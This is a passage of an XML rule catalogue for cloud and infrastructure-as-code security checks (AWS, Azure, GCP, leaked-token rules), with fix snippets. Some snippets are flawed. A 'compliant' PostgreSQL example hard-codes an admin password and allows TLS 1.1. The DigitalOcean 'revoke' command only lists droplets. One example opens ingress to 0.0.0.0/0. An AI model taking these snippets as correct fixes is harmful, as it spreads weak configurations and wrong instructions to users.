<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_rds_cluster_parameter_group.examplea.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_rds_cluster_parameter_group.examplea.tf">resource "aws_db_parameter_group" "examplea" {
  name = "rds-cluster-pg"
  family      = "postgres10"

+  parameter {
+    name="log_statement"
+    value="all"
+  }

+  parameter {
+    name="log_min_duration_statement"
+    value="1"
+  }
}
</code></pre></div></div>
<p>For more details see the aws docs here: <a href="https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/USER_LogAccess.Concepts.PostgreSQL.html" target="_self">https://docs.aws.amazon.com/AmazonRDS/latest/AuroraUserGuide/USER_LogAccess.Concepts.PostgreSQL.html</a></p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_32' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_32</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_32' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_35</key>
    <name>Ensure AWS NAT Gateways are utilized for the default route</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-nat-gateways-are-not-utilized-for-the-default-route"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-nat-gateways-are-not-utilized-for-the-default-route"></div>AWS NAT Gateways are not utilized for the default route</div><a aria-label="Skip link to AWS NAT Gateways are not utilized for the default route" class="heading-anchor-icon fa fa-anchor" href="#aws-nat-gateways-are-not-utilized-for-the-default-route"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix"></div>Fix</div><a aria-label="Skip link to Fix" class="heading-anchor-icon fa fa-anchor" href="#fix"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-nat-gateways-are-utilized-for-the-default-route' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-nat-gateways-are-utilized-for-the-default-route</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-nat-gateways-are-utilized-for-the-default-route' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_17</key>
    <name>Ensure PostgreSQL server enables customer-managed key for encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="postgresql-server-does-not-enable-customer-managed-key-for-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-postgre-sql-server-does-not-enable-customer-managed-key-for-encryption"></div>PostgreSQL server does not enable customer-managed key for encryption</div><a aria-label="Skip link to PostgreSQL server does not enable customer-managed key for encryption" class="heading-anchor-icon fa fa-anchor" href="#postgresql-server-does-not-enable-customer-managed-key-for-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use customer-managed keys to manage the encryption at rest of your PostgreSQL servers. By default, the data is encrypted at rest with service-managed keys, but customer-managed keys are commonly required to meet regulatory compliance standards. Customer-managed keys enable the data to be encrypted with an Azure Key Vault key created and owned by you. You have full control and responsibility for the key lifecycle, including rotation and management.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_key_vault,  azurerm_key_vault_access_policy,  azurerm_key_vault_key, azurerm_postgresql_server, azurerm_postgresql_server_key</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "ok" {
  name     = "ok-resources"
  location = "West Europe"
}

resource "azurerm_key_vault" "ok" {
  name                     = "okkv"
  location                 = azurerm_resource_group.ok.location
  resource_group_name      = azurerm_resource_group.ok.name
  tenant_id                = data.azurerm_client_config.current.tenant_id
  sku_name                 = "premium"
  purge_protection_enabled = true
}

resource "azurerm_key_vault_access_policy" "server" {
  key_vault_id       = azurerm_key_vault.ok.id
  tenant_id          = data.azurerm_client_config.current.tenant_id
  object_id          = azurerm_postgresql_server.ok.identity.0.principal_id
  key_permissions    = ["get", "unwrapkey", "wrapkey"]
  secret_permissions = ["get"]
}

resource "azurerm_key_vault_access_policy" "client" {
  key_vault_id       = azurerm_key_vault.ok.id
  tenant_id          = data.azurerm_client_config.current.tenant_id
  object_id          = data.azurerm_client_config.current.object_id
  key_permissions    = ["get", "create", "delete", "list", "restore", "recover", "unwrapkey", "wrapkey", "purge", "encrypt", "decrypt", "sign", "verify"]
  secret_permissions = ["get"]
}

resource "azurerm_key_vault_key" "ok" {
  name         = "tfex-key"
  key_vault_id = azurerm_key_vault.ok.id
  key_type     = "RSA"
  key_size     = 2048
  key_opts     = ["decrypt", "encrypt", "sign", "unwrapKey", "verify", "wrapKey"]
  depends_on = [
    azurerm_key_vault_access_policy.client,
    azurerm_key_vault_access_policy.server,
  ]
}

resource "azurerm_postgresql_server" "ok" {
  name                             = "ok-pg-server"
  location                         = azurerm_resource_group.ok.location
  resource_group_name              = azurerm_resource_group.ok.name
  sku_name                         = "GP_Gen5_2"
  administrator_login              = "acctestun"
  administrator_login_password     = "<a class="__cf_email__" data-cfemail="276f67744f1664487514" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>!"
  ssl_enforcement_enabled          = true
  ssl_minimal_tls_version_enforced = "TLS1_1"
  storage_mb                       = 51200
  version                          = "5.6"

  identity {
    type = "SystemAssigned"
  }
}

resource "azurerm_postgresql_server_key" "ok" {
  server_id        = azurerm_postgresql_server.ok.id
  key_vault_key_id = azurerm_key_vault_key.ok.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-customer-managed-key-for-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-customer-managed-key-for-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-customer-managed-key-for-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_8</key>
    <name>Ensure GCP Kubernetes engine clusters have stackdriver logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-engine-clusters-have-stackdriver-logging-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-engine-clusters-have-stackdriver-logging-disabled"></div>GCP Kubernetes engine clusters have stackdriver logging disabled</div><a aria-label="Skip link to GCP Kubernetes engine clusters have stackdriver logging disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-engine-clusters-have-stackdriver-logging-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Stackdriver is the default logging solution for clusters deployed on GKE. Stackdriver logging is deployed to a new cluster by default, explicitly set to <strong>opt-out</strong>. Stackdriver logging collects only the container&#8217;s standard output and standard error streams. To ingest logs, Stackdriver logging agent must be deployed to each node in the cluster. Stackdriver provides a single-pane-of-glass view of metrics, logs, and traces through Kubernetes Engine clusters and workloads. </p>
<p>We recommend you use Stackdriver logging as a unified data logging solution for GKE workloads unless additional observability tooling is already in place,</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_9</key>
    <name>Ensure GCP Kubernetes cluster node auto-repair configuration is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-cluster-node-auto-repair-configuration-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-cluster-node-auto-repair-configuration-is-disabled"></div>GCP Kubernetes cluster node auto-repair configuration is disabled</div><a aria-label="Skip link to GCP Kubernetes cluster node auto-repair configuration is disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-cluster-node-auto-repair-configuration-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Auto-repairing mode in GKE is an automated service that identifies and repairs a failing node to maintain a healthy running state. GKE makes periodic checks on the health state of each node in the cluster. If a node fails consecutive health checks over an extended time period, GKE initiates a repair process for that node.</p>
<p>We recommend automatic node repair is enabled on kubernetes clusters to provide continued operation of mission critical nodes and ensuring applications are operating based on their pre-defined specs, minimized downstream failures and redundant alerting and triage.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcloud-cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcloud-cli"></div>Gcloud CLI</div><a aria-label="Skip link to Gcloud CLI" class="heading-anchor-icon fa fa-anchor" href="#gcloud-cli"></a></h2>
<p>Use the following command line to enable the node-pool automatic repair feature:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">gcloud container node-pools update pool-name 
--cluster cluster-name \
--zone compute-zone \
--enable-autorepair
</code></pre>
<p>More information here: <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/node-auto-repai" target="_self">https://cloud.google.com/kubernetes-engine/docs/how-to/node-auto-repai</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>Add the following code bloc into your <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">google_container_node_pool</code> resource:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">  management {
    auto_repair  = true
  }
</code></pre>
<p>If you don't have a separated node-pool resource on your terraform codebase, you can refer to the <strong>Gcloud CLI</strong> part. You will first need to recover the name of the node pool through the console or the CLI. Please be reminded that it is best practice to delete the default node-pool from the cluster and to create a specific one using the <strong>google_container_node_pool</strong> resource.</p>
<p>More information here: <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/node-auto-repair" target="_self">https://cloud.google.com/kubernetes-engine/docs/how-to/node-auto-repair</a></p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_BCW_1</key>
    <name>Ensure no hard coded API token exist in the provider</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="bridgecrew-provider-has-hard-coded-api-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-bridgecrew-provider-has-hard-coded-api-token"></div>Bridgecrew provider has hard-coded API token</div><a aria-label="Skip link to Bridgecrew provider has hard-coded API token" class="heading-anchor-icon fa fa-anchor" href="#bridgecrew-provider-has-hard-coded-api-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Bridgecrew API Tokens can be used for integration of the cloud platform with tools such as Checkov, CircleCI and our Visual Studio plugin. Tokens also allow you to use our APIs (for example, for Custom Policies or Triggering Scans).<br/>
Tokens are specific per user and enforce the role and permission assigned to that user within the organization.<br/>
Users who are designated as Owner can view tokens for all users and, if necessary, delete them.<br/>
You can implement key rotation with our Token APIs for Create, Delete and List</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_28</key>
    <name>Buildkite Agent Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="buildkite-agent-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-buildkite-agent-token"></div>Buildkite Agent Token</div><a aria-label="Skip link to Buildkite Agent Token" class="heading-anchor-icon fa fa-anchor" href="#buildkite-agent-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Buildkite Agent requires an agent token to connect to Buildkite and register for work. If you are an admin of your Buildkite organization, you can view the tokens on your Agents page. When you create a new organization in Buildkite, a default agent token is created. This token can be used for testing and development, but it's recommended to create new, specific tokens for each new environment.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Tokens can be revoked using the GraphQL API with the agentTokenRevoke mutation.</p>
<p>You need to pass your agent token as the ID in the mutation. You can get the token from your Buildkite dashboard, in Agents &gt; Reveal Agent Token, or you can retrieve a list of agent token IDs using this query:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">PHP</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-php theme-light" data-lang="php" name="">query GetAgentTokenID {
  organization(slug: "organization-slug") {
    agentTokens(first:50) {
      edges {
        node {
          id
          uuid
          description
        }
      }
    }
  }
}
</code></pre></div></div>
<p>Then, using the token ID, revoke the agent token:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">PHP</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-php theme-light" data-lang="php" name="">mutation {
  agentTokenRevoke(input: {
    id: "token-id",
    reason: "A reason"
  }) {
    agentToken {
      description
      revokedAt
      revokedReason
    }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_28' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_28</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_28' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_34</key>
    <name>DigitalOcean Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="digitalocean-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-digital-ocean-token"></div>DigitalOcean Token</div><a aria-label="Skip link to DigitalOcean Token" class="heading-anchor-icon fa fa-anchor" href="#digitalocean-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>To use the DigitalOcean API, you&#8217;ll need to generate a personal access token. Personal access tokens function like ordinary OAuth access tokens. You can use them to authenticate to the API by including one in a bearer-type Authorization header with your request. </p>
<p>Tokens function like passwords. Do not hard code your tokens into programs where they may accidentally be released in version control and are harder to rotate. Instead, use environmental variables. If a token becomes compromised, delete it to revoke that token&#8217;s access.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Revoke Token<br/>
Use the access_token in your token revocation request, which is a POST request to the revoke endpoint with the appropriate parameters.<br/>
<a href="https://cloud.digitalocean.com/v1/oauth/revoke" target="_self">https://cloud.digitalocean.com/v1/oauth/revoke</a></li>
</ol>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">cURL</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-curl theme-light" data-lang="curl" name="">curl -X GET "https://api.digitalocean.com/v2/droplets" \
  -H "Authorization: Bearer $TOKEN"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_34' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_34</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_34' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_35</key>
    <name>Discord Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="discord-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-discord-token"></div>Discord Token</div><a aria-label="Skip link to Discord Token" class="heading-anchor-icon fa fa-anchor" href="#discord-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Discord token provides full access to your account and is required to perform actions within Discord. It&#8217;s also useful for allowing bots to do things on your behalf outside of the Discord client. If you need your Discord token, the only way to find it is via Discord&#8217;s developer tools.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">cURL</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-curl theme-light" data-lang="curl" name="">POST https://discord.com/api/oauth2/token/revoke
Content-Type: application/x-www-form-urlencoded
data:
  client_id: &lt;client_id&gt;
  client_secret: &lt;client_secret&gt;
  token: &lt;access_token&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_35' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_35</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_35' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_36</key>
    <name>Doppler API Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="doppler-api-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-doppler-api-key"></div>Doppler API Key</div><a aria-label="Skip link to Doppler API Key" class="heading-anchor-icon fa fa-anchor" href="#doppler-api-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The API uses Doppler tokens to authenticate requests. You can generate and manage your tokens in the dashboard on the Tokens page. Tokens carry many privileges, so be sure to keep them secure! Do not store your secret tokens in an .env file or share them in publicly accessible areas such as GitHub, client-side code, etc. Personal and CLI tokens can both read and write in a workspace and service tokens are read-only in a single configuration.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Text</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-text theme-light" data-lang="text" name="">curl --request POST \
     --url https://api.doppler.com/v3/auth/revoke \
     --header 'Accept: application/json' \
     --header 'Content-Type: application/json' \
     --data '
{
     "token": "&lt;YOUR TOKEN&gt;"
}
'
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_36' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_36</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_36' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_37</key>
    <name>DroneCI Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="droneci-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-drone-ci-token"></div>DroneCI Token</div><a aria-label="Skip link to DroneCI Token" class="heading-anchor-icon fa fa-anchor" href="#droneci-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The remote API uses access tokens to authorize requests. You can retrieve an access token in the Drone user interface by navigating to your user profile. Authorization to the API is performed using the HTTP Authorization header. Provide your token as the bearer token value.</p>
<p>If your repository is private or requires authentication to clone, Drone injects the credentials into your pipeline environment. Drone uses the oauth2 token associated with the repository owner as the clone credentials.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_37' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_37</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_37' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_5</key>
    <name>Ensure Security Groups are attached to EC2 instances or ENIs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="security-groups-are-not-attached-to-ec2-instances-or-enis"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-groups-are-not-attached-to-ec-2-instances-or-en-is"></div>Security Groups are not attached to EC2 instances or ENIs</div><a aria-label="Skip link to Security Groups are not attached to EC2 instances or ENIs" class="heading-anchor-icon fa fa-anchor" href="#security-groups-are-not-attached-to-ec2-instances-or-enis"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A check to ensure that orphaned Security groups aren't created. Elastic Network Interfaces (ENIs). This checks that Security Groups are attached to provisioning resources. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_network_interface, aws_instance, aws_security_group</li>
<li><strong>Argument:</strong> <em>security_groups</em> of aws_instance or aws_security_group</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_network_interface" "test" {
  subnet_id       = "aws_subnet.public_a.id"
  security_groups = [aws_security_group.ok_sg.id]
}

resource "aws_instance" "test" {
  ami           = "data.aws_ami.ubuntu.id"
  instance_type = "t3.micro"
  security_groups = [aws_security_group.ok_sg.id]
}

resource "aws_security_group" "ok_sg" {
  ingress {
    description = "TLS from VPC"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = 0.0.0.0/0
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-security-groups-are-attached-to-ec2-instances-or-elastic-network-interfaces-enis' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-security-groups-are-attached-to-ec2-instances-or-elastic-network-interfaces-enis</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-security-groups-are-attached-to-ec2-instances-or-elastic-network-interfaces-enis' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_10</key>
    <name>Ensure GCP Kubernetes cluster node auto-upgrade configuration is enabled</name>
    <description>
